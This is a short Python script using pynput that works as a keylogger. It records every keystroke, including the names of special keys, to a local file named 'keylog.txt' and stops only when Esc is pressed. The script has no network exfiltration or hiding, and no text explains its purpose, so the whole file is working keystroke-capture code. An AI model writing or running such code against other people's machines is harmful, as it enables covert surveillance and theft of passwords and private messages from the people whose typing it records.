import pynput
from pynput.keyboard import Key, Listener

# File to store the logged keys
log_file = "keylog.txt"

# Function to log the key strokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"{key}")

# Function to handle key release
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
